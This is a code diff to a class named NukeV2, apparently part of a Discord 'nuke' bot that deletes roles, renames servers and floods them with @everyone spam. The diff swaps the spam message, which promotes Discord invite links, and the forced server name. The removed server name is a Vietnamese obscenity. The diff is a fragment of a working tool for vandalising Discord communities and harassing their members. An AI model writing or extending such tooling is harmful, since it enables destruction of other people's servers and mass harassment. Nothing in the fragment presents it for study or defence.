@@ -1534,7 +1534,7 @@ class NukeV2:
             return
         self.last_nuke_time = current_time
 
-        spam_content = "# <a:Black_cross:1353971971095793776> **__SERVER ĐÃ BỊ NUKE, LẤY BOT IB T ℠__** <a:Black_cross:1353971971095793776>\n> ||@everyone @here||\n> ||Join:|| https://discord.gg/AHGy3yMzjE\n> ||Join 2:|| not server support 2"
+        spam_content = "# <a:Black_cross:1353971971095793776> **𝔾𝔾.𝕂ℤ3ℕ/𝕂ℤ4ℕ - 𝔹Á 𝕋𝕆ℙ 𝕁𝕆𝕀ℕ 𝕊𝔼ℝ𝕍𝔼ℝ 𝕊𝕌ℙℙ𝕆ℝ𝕋 1 Đ𝕀** <a:Black_cross:1353971971095793776>\n> ||@everyone @here||\n> ||Join:|| https://discord.gg/PVtT85EPn\n> ||Join 2:|| not server support 2"
         image_url = "https://i.pinimg.com/originals/df/1b/55/df1b5570637dfa5dea04929d5a787a1e.gif"
 
         await self._log("Starting role deletion...")
@@ -1591,7 +1591,7 @@ class NukeV2:
 
     async def _rename_server(self, guild):
         try:
-            await guild.edit(name="NGU LỒN CHA MINH BÁ TOP�")
+            await guild.edit(name="G̸G̴.̵K̶Z̵3̷N̵.̶K̶Z̸4̴N̷ -̶ B̷Á̸ T̸O̶P̷ ,̸ H̵O̷T̶ W̷A̸R̶")
         except Exception as e:
             await self._log(f"Failed to rename server: {e}")
 
